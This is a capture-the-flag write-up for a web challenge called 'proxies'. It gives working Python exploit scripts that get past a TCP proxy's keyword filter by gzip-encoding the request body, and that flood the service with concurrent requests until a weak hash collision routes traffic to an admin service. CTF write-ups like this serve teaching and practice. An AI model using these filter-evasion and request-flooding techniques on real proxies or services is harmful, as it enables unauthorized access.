# proxies - web

There is tcp proxy written in go that handles tunnel between proxy service (entry point) and agent service (target with flags).

The accessible services are written in flask
proxy service on proxy container
user and admin service on agent container


flag 1 

You could just get flag if send post "GIVE ME FLAG!" to any non empty path /xxx
but proxy filters traffic and replaces text that lowercase matches 'give me flag!' with 'REDACTED   '.

Solution: user service allows to send encoded post data in request (that is not standard behavior at all) if Content-Encoding header is specified in req

solution: send gzip encoded req (proxy analyzes raw tcp data) 

```python
import requests
import gzip

url = "https://inst-6ead480c13c5fb46-proxies.chal.crewc.tf/"


r = requests.post(url+"/aaaa",data=gzip.compress(b"GIVE ME FLAG!"),headers={"Content-Encoding":"gzip"})

print(r.text)
```

flag 2


agent listens for connections from proxy. It caches req and calculates weak hash (small part of sha256 applied n times). Data is send based on request hash so if hash collision happens data is sent to different socket.

solution: just spam reqs and requests to both user and agent(30/s is enough) and req to user service port eventually become req to admin service port

```python
import _thread


url = "https://inst-7051cacd9c6e0fad-proxies.chal.crewc.tf/"


def req(part):
    import requests

    resp = requests.get(url+part)

    #print(resp.text,part)
    _filter = ["OK", "Error contacting admin service"]
    if not any([x == resp.text for x in _filter]):
        print(mod, resp.text)
2


if __name__ == "__main__":
    import time
    for i in range(100000):

        mod = i
        print(mod)
        for j in range(30):
            part = "/admin_check" if (i+j)%2==0 else "/admin"

            _thread.start_new_thread(req, (part,))
        time.sleep(3)

    time.sleep(100)
```
